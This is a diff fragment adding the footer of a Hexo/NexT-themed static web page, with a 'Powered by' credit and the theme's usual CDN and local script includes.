+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
